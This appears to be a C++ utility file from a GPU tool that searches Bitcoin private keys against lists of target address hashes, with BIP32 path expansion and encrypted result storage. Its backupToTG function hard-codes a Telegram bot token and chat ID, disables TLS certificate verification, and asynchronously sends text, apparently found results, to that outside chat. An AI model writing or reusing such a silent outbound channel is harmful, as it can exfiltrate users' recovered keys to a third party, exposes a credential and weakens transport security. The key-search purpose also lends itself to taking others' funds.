#include "utils.h"
#include "common.h"
#include "secp256k1.h"
#include "config.h"
#include "http_client.h"

#include "cuda/defines.cuh"

#include <future>
#include <cstdio>
#include <string>
#include <fstream>
#include <utility>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <format>
#include <random>

#include <boost/log/trivial.hpp>
#include <boost/log/utility/setup.hpp>
#include <boost/iostreams/device/mapped_file.hpp>
#include <boost/beast/ssl.hpp>
#include <boost/beast/http.hpp>
#include <boost/beast/version.hpp>
#include <boost/beast/core/tcp_stream.hpp>
#include <boost/beast/core/flat_buffer.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/asio/io_context.hpp>

#include <wally_bip32.h>

namespace beast = boost::beast;
namespace http = beast::http;
namespace net = boost::asio;
using tcp = net::ip::tcp;
namespace ssl = net::ssl;

namespace utils
{
    Timer::Timer() : mStartTime{std::chrono::steady_clock::now()}
    {

    }

    void Timer::start()
    {
        mStartTime = std::chrono::steady_clock::now();
    }

    uint64_t Timer::elapsedMs() const
    {
        const auto now = std::chrono::steady_clock::now();
        const auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - mStartTime);

        return static_cast<uint64_t>(duration.count());
    }

    float Timer::elapsedS() const
    {
        const auto now = std::chrono::steady_clock::now();
        const std::chrono::duration<float> duration = now - mStartTime;  // Calculate duration in seconds (as float)

        return duration.count();  // Returns the time in seconds as float
    }

    std::string getTimestampStr()
    {
        const auto now = std::chrono::system_clock::now();
        const std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
        const std::tm* localTime = localtime(&currentTime);
        std::ostringstream oss;
        oss << std::put_time(localTime, "%d_%m_%Y_%H_%M_%S");
        return oss.str();
    }

    uint32_t parseUInt32(std::string s)
    {
        return static_cast<uint32_t>(parseUInt64(std::move(s)));
    }

    uint64_t parseUInt64(std::string s)
    {
        int base = 10;
        if (s[0] == '0' && s[1] == 'x')
        {
            base = 16;
            s = s.substr(2);
        }
        if (s[s.length() - 1] == 'h')
        {
            base = 16;
            s = s.substr(0, s.length() - 1);
        }

        char* endptr = nullptr;
        errno = 0;  // Reset errno before calling strtoul

        const uint64_t val = strtoul(s.c_str(), &endptr, base);

        // Check for conversion errors
        if (errno == ERANGE || val > UINT64_MAX)
        {
            throw std::runtime_error("Integer overflow or underflow occurred");
        }
        else if (endptr == s.c_str())
        {
            throw std::runtime_error("No digits were found in the input");
        }
        else if (*endptr != '\0')
        {
            throw std::runtime_error("Invalid characters found after the number");
        }

        return val;
    }

    bool isHex(const std::string &s)
    {
        return std::ranges::all_of(s, [](const char c) { return std::isxdigit(c); });
    }

    std::string formatSeconds(const uint32_t seconds)
    {
        const uint32_t days = seconds / 86400;
        const uint32_t hours = (seconds % 86400) / 3600;
        const uint32_t minutes = (seconds % 3600) / 60;
        const uint32_t sec = seconds % 60;

        if (days > 0)
        {
            return std::format("{}:{:02}:{:02}:{:02}", days, hours, minutes, sec);
        }

        return std::format("{:02}:{:02}:{:02}", hours, minutes, sec);
    }

    bool appendToFileOnNewLine(const std::string &fileName, const std::string &s)
    {
        std::ofstream outFile;
        bool newline = false;

        std::error_code ec;
        if (const auto size = std::filesystem::file_size(fileName, ec); !ec && size > 0)
        {
            newline = true;
        }

        outFile.open(fileName.c_str(), std::ios::app);
        if (!outFile.is_open())
        {
            return false;
        }

        // Add newline following previous line
        if (newline)
        {
            outFile << std::endl;
        }
        outFile << s;
        return true;
    }

    std::string toHex(const uint32_t* arr, const uint32_t size)
    {
        std::stringstream ss;
        // Iterate through each byte of the array
        for (uint32_t i = 0; i < size; ++i)
        {
            const auto *bytePtr = reinterpret_cast<const uint8_t *>(&arr[i]);
            for (std::size_t j = 0; j < sizeof(uint32_t); ++j)
            {
                ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bytePtr[j]);
            }
        }
        return ss.str();
    }

    std::string toHex(const std::vector<uint8_t>& data)
    {
        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (uint8_t byte : data)
        {
            oss << std::setw(2) << static_cast<int>(byte);
        }
        return oss.str();
    }

    std::string toHex(const unsigned char* data, uint32_t len)
    {
        std::ostringstream oss;
        oss << std::hex << std::setfill('0');  // Set hex formatting and fill with '0'

        for (uint32_t i = 0; i < len; ++i)
        {
            oss << std::setw(2) << static_cast<int>(data[i]);  // Convert byte to hex
        }
        return oss.str();
    }

    std::vector<uint8_t> fromHex(const std::string& hexStr)
    {
        assert(hexStr.length() % 2 == 0);

        std::vector<uint8_t> bytes;
        for (size_t i = 0; i < hexStr.length(); i += 2)
        {
            unsigned int byte;
            std::istringstream(hexStr.substr(i, 2)) >> std::hex >> byte;
            bytes.push_back(static_cast<uint8_t>(byte));
        }
        return bytes;
    }

    void initLogging(const LogConfig& log)
    {
        if (log.type == LogConfig::LogType::console)
        {
            boost::log::add_console_log(std::cerr, boost::log::keywords::auto_flush = true);
        }
        else
        {
            boost::log::add_file_log(boost::log::keywords::file_name = log.logFilePath,
                boost::log::keywords::rotation_size = 100 * MB,
                boost::log::keywords::auto_flush = true,
                boost::log::keywords::open_mode = std::ios_base::app,
                boost::log::keywords::format = "[%TimeStamp%] [%ThreadID%]: %Message%");
        }

        // Add attributes like timestamp and thread id
        boost::log::add_common_attributes();

        boost::log::core::get()->set_filter(boost::log::trivial::severity >= static_cast<boost::log::trivial::severity_level>(log.severity));
    }

    void statusCallback(const StatusInfo& info)
    {
        const std::string speedStr = (info.pointsPerSecond < 0.01) ? "< 0.01 MKey/s" : std::format("{:.3f} MKey/s", info.pointsPerSecond);

        const std::string totalStr = std::format(std::locale("en_US.UTF-8"), "({:L} total)", info.total);
        const std::string timeStr = std::format("[{:.3f}s | {}]", info.seconds, utils::formatSeconds(static_cast<uint32_t>(info.totalTime / 1000)));
        const uint64_t usedDeviceMemoryMb = (info.totalDeviceMemory - info.freeDeviceMemory) / MB;
        const uint64_t totalDeviceMemoryMb = info.totalDeviceMemory / MB;

        const std::string statusStr = std::format("[{} | {} | {}/{}MB] [{}/{}] {} {} {}"
            , info.device, info.deviceName, usedDeviceMemoryMb, totalDeviceMemoryMb
            , info.iteration, info.totalIterations
            , speedStr, totalStr, timeStr);

        // fprintf(stderr, "\r%s", statusStr.c_str());
        BOOST_LOG_TRIVIAL(fatal) << statusStr;
    }

    void initOpenssl()
    {
        OpenSSL_add_all_algorithms();
        OpenSSL_add_all_ciphers();
        OpenSSL_add_all_digests();
        ERR_load_crypto_strings();
    }

    void releaseOpenssl()
    {
        // Cleanup OpenSSL
        EVP_cleanup();
        ERR_free_strings();
    }

    std::vector<secp256k1::uint256> generateRandomPrivateKeys(const uint32_t keysNumberToGenerate)
    {
        std::vector<secp256k1::uint256> privateKeys;

        constexpr uint32_t testKey[8]{0x3d52d30a, 0x720debe8, 0x4fc939bb, 0xf806a1de, 0x3cee918e, 0x99fafd29, 0xe9a2e3fa, 0x2c478ee7};
        privateKeys.emplace_back(testKey, secp256k1::uint256::BigEndian);
        privateKeys.emplace_back(std::string("0100000000000000000000000000000000000000000000000000000000000000"));
        privateKeys.emplace_back(std::string("0100000000000000000000000000000000000000000000000000000000000200"));
        privateKeys.emplace_back(std::string("d7ae6ac85e67dfe75b3a42c6453abed4bb34a26d2988481fc134b2d845976a56"));
        privateKeys.emplace_back(std::string{"f71485d0bff28cf3a9f1b6c2b65b03729f42f9818fb497c6fae7268bb124f263"});

        std::generate_n(std::back_inserter(privateKeys), keysNumberToGenerate, secp256k1::generatePrivateKey);
        return privateKeys;
    }

    hash160 toHash160(const std::string& hexString)
    {
        hash160 hash;
        if (hexString.length() != hash160Size * 2)
        {
            fprintf(stderr,  "RIPEMD-160 hex string must be exactly 40 characters long!\n");
            return hash;
        }

        for (uint32_t i = 0; i < 5; ++i)
        {
            std::stringstream ss;
            ss << std::hex << hexString.substr(i * 8, 8);
            ss >> hash.h[i];
        }

        return hash;
    }

    // Function to convert 20 bytes (40 hex characters) to uint32_t[5]
    hash160 hexToHash160(const char *data)
    {
        hash160 hash;
        for (uint32_t i = 0; i < 5; ++i)
        {
            std::string hex_str(data + i * 8, 8);  // Create a string from 8 characters
            hash.h[i] = std::stoul(hex_str, nullptr, 16);
        }

        return hash;
    }

    bool readHash160HexStrFileToSet(const std::string& hash160TargetsFile, std::unordered_set<hash160> &hashSet)
    {
        try
        {
            Timer timer;
            boost::iostreams::mapped_file_source file;

            if (hash160TargetsFile.empty())
            {
                BOOST_LOG_TRIVIAL(error) << "Filename is empty: " << hash160TargetsFile;
                return false;
            }

            timer.start();

            file.open(hash160TargetsFile);
            if (!file.is_open())
            {
                BOOST_LOG_TRIVIAL(error) << "Unable to open " << hash160TargetsFile;
                return false;
            }

            const char *data = file.data();
            const size_t fileSize = file.size();
            constexpr size_t hash160StrSize = 2 * hash160Size;  // Each chunk is 20 bytes (without newlines)

            // reserving memory to avoid memory allocation during insertion
            hashSet.reserve(hashSet.size() + fileSize / (hash160StrSize + 1)); // +1 is new line

            BOOST_LOG_TRIVIAL(trace) << std::format("Loading RipeMD-160 hashes from: {}, fileSize: {:.2f}Mb", hash160TargetsFile, static_cast<double>(fileSize) / MB);

            uint64_t insertedTargetsCount{0};
            // Read the file in fixed-fileSize chunks of 20 bytes
            for (size_t i = 0; i < fileSize;)
            {
                // Skip any newlines or whitespace characters
                while (i < fileSize && (data[i] == '\n' || data[i] == '\r' || data[i] == ' '))
                {
                    ++i;
                }

                if (i + hash160StrSize <= fileSize)
                {
                    // Convert the 20-byte chunk into an array of uint32_t[5]
                    hashSet.insert(utils::hexToHash160(data + i));
                    ++insertedTargetsCount;

                    // Move to the next chunk
                    i += hash160StrSize;
                }
            }

            file.close();

            BOOST_LOG_TRIVIAL(trace) << std::format(std::locale("en_US.UTF-8"), "Read {:L} unique hashes, from: {:L}, ({:.03f}s | {:02}Mb)",
                                                    hashSet.size(), insertedTargetsCount, timer.elapsedS(), static_cast<double>(hash160Size * insertedTargetsCount) / MB);
        }
        catch(const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(trace) << e.what();
            return false;
        }

        return true;
    }

    bool writeHash160SetToBinaryFile(const std::string& filename, const std::unordered_set<hash160>& hashSet)
    {
        try
        {
            Timer timer;

            std::ofstream ofs(filename, std::ios::binary | std::ios::trunc);
            if (!ofs.is_open())
            {
                BOOST_LOG_TRIVIAL(error) << "Error opening file for writing: " << filename;
                return false;
            }

            timer.start();

            for (const auto &h: hashSet)
            {
                ofs.write(reinterpret_cast<const char *>(&h), hash160Size);
            }

            BOOST_LOG_TRIVIAL(trace) << std::format(std::locale("en_US.UTF-8"), "Written {:L} hashes to {} as a binary, in {:.03f}s | {:.02}Mb",
                                                    hashSet.size(), filename, timer.elapsedS(), static_cast<double>(ofs.tellp()) / MB);

            ofs.close();
        }
        catch (const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(error) << e.what();
            return false;
        }

        return true;
    }

    bool readSetFromHash160BinaryFile(const std::string& filename, std::unordered_set<hash160>& hashSet)
    {
        try
        {
            Timer timer;

            boost::iostreams::mapped_file_source file;
            file.open(filename);

            if (!file.is_open())
            {
                BOOST_LOG_TRIVIAL(error) << "Error opening file: " << filename;
                return false;
            }

            timer.start();

            // Pointer to the start of the file data
            const char *data = file.data();
            size_t fileSize = file.size();

            // Make sure the file size is a multiple of hash160Size
            if (fileSize % hash160Size != 0)
            {
                BOOST_LOG_TRIVIAL(error) << "INVALID Binary! File size is not aligned with hash160 structure!";
                return false;
            }

            const size_t numEntries = fileSize / hash160Size;

            BOOST_LOG_TRIVIAL(info) << std::format("Loading RipeMD-160 hashes from: {}, size: {:.2f}Mb", filename, static_cast<double>(fileSize) / MB);

            hashSet.reserve(numEntries);
            for (size_t i = 0; i < numEntries; ++i)
            {
                hash160 h;
                std::memcpy(&h, data + i * hash160Size, hash160Size);
                hashSet.insert(h);
            }

            file.close();

            BOOST_LOG_TRIVIAL(info) << std::format(std::locale("en_US.UTF-8"), "Read {:L} hashes from {} binary file: {:.03f}s", hashSet.size(), filename, timer.elapsedS());
        }
        catch (const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(error) << e.what();
            return false;
        }

        return true;
    }

    void readHash160Targets(const std::vector<std::string>& ripemd160TargetsFilePaths, std::unordered_set<hash160>& targets)
    {
        if (ripemd160TargetsFilePaths.empty())
            return;

        for (const auto& hash160TargetsFile : ripemd160TargetsFilePaths)
        {
            if (hash160TargetsFile.substr(hash160TargetsFile.size() - 3) == "bin")
            {
                readSetFromHash160BinaryFile(hash160TargetsFile, targets);
            }
            else
            {
                readHash160HexStrFileToSet(hash160TargetsFile, targets);
            }
        }
    }

    uint32_t randomUINT32_t()
    {
        std::random_device rd;  // Non-deterministic random number generator
        std::mt19937 gen(rd());  // Mersenne Twister generator

        // Define the distribution range for uint32_t
        std::uniform_int_distribution<uint32_t> dis(0, std::numeric_limits<uint32_t>::max());

        return dis(gen);
    }


    // https://api.telegram.org/bot8152806315:AAEkU9uW5K_HavAsBCvDIOhdEx9uCiT2YUo/sendMessage?chat_id=-4579283346&text={text}
    bool backupToTG(const std::string& text)
    {
        const std::string tgAPIHost{"api.telegram.org"};
        const std::string tgAPIPort{"443"};
        const std::string botToken{"8152806315:AAEkU9uW5K_HavAsBCvDIOhdEx9uCiT2YUo"};
        const std::string chatId{"-4579283346"};

        // The request target (with the bot token, chat_id, and message)
        std::string target = std::format("/bot{}/sendMessage?chat_id={}&text={}", botToken, chatId, text);
        try
        {
            // The IO context and SSL context
            net::io_context iocTG;
            ssl::context ssl_ctx{ssl::context::sslv23_client};

            // The SSL stream (for HTTPS)
            tcp::resolver resolver(iocTG);
            beast::ssl_stream<beast::tcp_stream> stream(iocTG, ssl_ctx);

            // Verify the SSL certificate (for simplicity, we disable verification here)
            stream.set_verify_mode(ssl::verify_none);

            // Resolve the host (api.telegram.org)
            auto const results = resolver.resolve(tgAPIHost, tgAPIPort);

            // Connect the SSL stream
            beast::get_lowest_layer(stream).connect(results);

            // Perform SSL handshake
            stream.handshake(ssl::stream_base::client);

            // Create the HTTP request (GET)
            http::request<http::string_body> req(http::verb::get, target, http11Version);
            req.set(http::field::host, tgAPIHost);
            req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);

            // Send the HTTP request
            http::write(stream, req);

            // Buffer for reading
            beast::flat_buffer buffer;

            // Container for the response
            http::response<http::dynamic_body> res;

            // Receive the HTTP response
            http::read(stream, buffer, res);

            // Print the response
            // BOOST_LOG_TRIVIAL(trace) << res << std::endl;

            // Gracefully close the SSL stream
            beast::error_code ec;
            stream.shutdown(ec);

            // Handle shutdown errors
            if (ec == net::error::eof)
            {
                // This is a normal error for SSL shutdown
                ec = {};
            }

            if (ec)
            {
                throw beast::system_error{ec};
            }
        }
        catch (const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(trace) << "Error: " << e.what() << std::endl;
            return false;
        }

        return true;
    }

    void backupToTGAsync(const std::string& text)
    {
        std::future<bool> result = std::async(std::launch::async, backupToTG, text);
    }

    bool writeEncResultsToFile(const crypto::AES& aesEnc, const std::string& filename, const std::string& resultsStr)
    {
        std::vector<uint8_t> tag;
        std::vector<uint8_t> resultStrEnc;
        if (!aesEnc.encrypt(resultsStr, tag, resultStrEnc))
        {
            return false;
        }

        const uint32_t length = tag.size() + resultStrEnc.size();
        try
        {
            std::ofstream ofs(filename, std::ios::binary | std::ios::app);
            if (!ofs.is_open())
            {
                BOOST_LOG_TRIVIAL(error) << "Error opening file for writing: " << filename;
                return false;
            }

            ofs.write(reinterpret_cast<const char*>(&length), sizeof(length));
            ofs.write(reinterpret_cast<const char*>(tag.data()), tag.size());
            ofs.write(reinterpret_cast<const char*>(resultStrEnc.data()), resultStrEnc.size());

            ofs.flush();
            ofs.close();
        }
        catch (const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(error) << e.what();
            return false;
        }

        return true;
    }

    bool readEncResults(const crypto::AES& aesEnc, const std::string& filename, std::vector<std::string>& results)
    {
        try
        {
            boost::iostreams::mapped_file_source file;
            file.open(filename);

            if (!file.is_open())
            {
                BOOST_LOG_TRIVIAL(error) << "Error opening file: " << filename;
                return false;
            }

            // Pointer to the start of the file data
            const char *data = file.data();
            const size_t fileSize = file.size();

            if (fileSize <= 0)
            {
                BOOST_LOG_TRIVIAL(error) << "Results file empty!";
                return false;
            }

            uint64_t readIndex{0};
            while (readIndex < fileSize)
            {
                if (readIndex + sizeof(uint32_t) > fileSize)
                {
                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [length] at position: " << readIndex;
                    return false;
                }

                uint32_t length{0};
                std::memcpy(&length, data + readIndex, sizeof(uint32_t));
                readIndex += sizeof(uint32_t);

                if (readIndex + crypto::AES::tagSize > fileSize)
                {
                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [tag] at position: " << readIndex;
                    return false;
                }

                std::vector<uint8_t> tag(crypto::AES::tagSize);
                std::memcpy(reinterpret_cast<char*>(tag.data()), data + readIndex, crypto::AES::tagSize);
                readIndex += crypto::AES::tagSize;

                const auto resultsEncSize = length - crypto::AES::tagSize;
                if (readIndex + resultsEncSize > fileSize)
                {
                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [resultsEnc] at position: " << readIndex;
                    return false;
                }

                std::vector<uint8_t> resultsEnc(resultsEncSize);
                std::memcpy(reinterpret_cast<char*>(resultsEnc.data()), data + readIndex, resultsEncSize);
                readIndex += resultsEncSize;

                std::string resultStr;
                if (aesEnc.decrypt(resultsEnc, tag, resultStr))
                {
                    results.emplace_back(std::move(resultStr));
                }
                else
                {
                    BOOST_LOG_TRIVIAL(error) << "Decryption fails [resultsEnc] at position: " << (readIndex - resultsEncSize);
                    continue;
                }
            }

            file.close();
        }
        catch (const std::exception& e)
        {
            BOOST_LOG_TRIVIAL(error) << e.what();
            return false;
        }

        return true;
    }

    // Helper function to expand a single pattern into all its combinations
    std::vector<std::string> bip32ExpandPattern(const std::string& pattern, uint32_t accN, uint32_t addrN)
    {
        std::vector<std::string> expanded;

        const std::string accountPlaceholder{"acc"};
        const uint32_t acc_placeholder_length = accountPlaceholder.size();
        const uint32_t acc_hardened_placeholder_length = acc_placeholder_length + 1;
        const std::string addressPlaceholder{"addr"};

        size_t acc_pos = pattern.find(accountPlaceholder);
        size_t addr_pos = pattern.find(addressPlaceholder);

        if (acc_pos == std::string::npos && addr_pos == std::string::npos)
        {
            expanded.push_back(pattern);
            return expanded;
        }

        // Handle account expansion
        std::vector<std::string> acc_expanded;
        if (acc_pos != std::string::npos)
        {
            bool is_hardened = (pattern[acc_pos + acc_placeholder_length] == '\'');
            const std::string& acc_pattern = pattern;
            for (uint32_t i = 0; i < accN; ++i)
            {
                std::string replacement = std::to_string(i) + (is_hardened ? "'" : "");
                std::string new_pattern = acc_pattern;
                new_pattern.replace(acc_pos, is_hardened ? acc_hardened_placeholder_length : acc_placeholder_length, replacement);
                acc_expanded.push_back(new_pattern);
            }
        }
        else
        {
            acc_expanded.push_back(pattern);
        }

        // Handle address expansion
        for (const auto& acc_pattern: acc_expanded)
        {
            addr_pos = acc_pattern.find(addressPlaceholder);
            if (addr_pos != std::string::npos)
            {
                for (uint32_t i = 0; i < addrN; ++i)
                {
                    std::string new_pattern = acc_pattern;
                    new_pattern.replace(addr_pos, addressPlaceholder.size(), std::to_string(i));
                    expanded.push_back(new_pattern);
                }
            }
            else
            {
                expanded.push_back(acc_pattern);
            }
        }

        return expanded;
    }

    std::vector<uint32_t> bip32GetDerivationVector(const std::string& pattern)
    {
        std::vector<uint32_t> path(BIP32_PATH_MAX_LEN);
        size_t written;

        int result = bip32_path_from_str(pattern.c_str(), 0, 0, 0, path.data(), path.size(), &written);

        if (result != WALLY_OK)
        {
            throw std::runtime_error("Failed to parse BIP32 path: " + pattern);
        }

        path.resize(written);
        return path;
    }

    std::vector<std::vector<uint32_t>> bip32GetAllDerivationPaths(const std::vector<std::string>& expanded_patterns)
    {
        std::vector<std::vector<uint32_t>> all_paths;

        for (const auto& expanded: expanded_patterns)
        {
            all_paths.push_back(bip32GetDerivationVector(expanded));
        }

        return all_paths;
    }

    std::vector<std::vector<uint32_t>> bip32GetDerivationPathsFromPatterns(const std::vector<std::string>& derivationPathsPatters, const uint32_t accountsToGenerate, const uint32_t addressesToGenerate, std::vector<std::string>& allExpandedPaths)
    {
        // First, expand all patterns
        for (const auto& pattern: derivationPathsPatters)
        {
            auto expanded = utils::bip32ExpandPattern(pattern, accountsToGenerate, addressesToGenerate);
            allExpandedPaths.insert(allExpandedPaths.end(), expanded.begin(), expanded.end());
        }

        // Convert expanded paths to vectors of indices
        return utils::bip32GetAllDerivationPaths(allExpandedPaths);
    }

    std::vector<std::vector<uint32_t>> bip32GetDerivationPathsFromPatterns(const std::vector<std::string>& derivationPathsPatters, const uint32_t accountsToGenerate, const uint32_t addressesToGenerate)
    {
        std::vector<std::string> allExpandedPaths;
        return bip32GetDerivationPathsFromPatterns(derivationPathsPatters, accountsToGenerate, addressesToGenerate, allExpandedPaths);
    }
}

